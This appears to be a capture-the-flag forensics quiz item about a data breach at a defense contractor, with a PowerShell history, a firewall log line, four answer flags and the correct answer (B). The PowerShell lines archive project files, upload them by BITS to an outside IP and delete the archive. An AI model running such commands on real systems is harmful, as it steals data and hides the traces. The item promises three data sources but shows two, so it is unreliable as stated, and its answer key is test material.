# Hard CTF - Full Exfil Hunt and Attribution

You are investigating a breach at a defense contractor. Three data points have been collected from different sources.

---

**Endpoint - PowerShell history on workstation WS-14:**
```powershell
Compress-Archive -Path C:\Projects\NavalSpec_2024\ -DestinationPath C:\Windows\Temp\patch_cache.zip
Start-BitsTransfer -Source C:\Windows\Temp\patch_cache.zip `
                   -Destination http://45.76.112.88/drop/patch_cache.zip `
                   -TransferType Upload
Remove-Item C:\Windows\Temp\patch_cache.zip -Force
```

**Network - Firewall log for WS-14 around the same time:**
```

[2024-04-02 03:44:11] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   (resumed)

## Question

Based on all three data sources, what is the most accurate and complete conclusion?

---

## Flags (Choose One)

- **A)** An insider threat manually uploaded project files during off-hours - no malware involved
- **B)** A nation-state threat actor used BITS to exfiltrate classified naval project files, covering tracks by deleting the archive after transfer
- **C)** An automated backup job misconfigured by IT sent files to a cloud storage server
- **D)** The BITS transfer was blocked by the firewall before any data left the network

---

Correct Flag: **B**
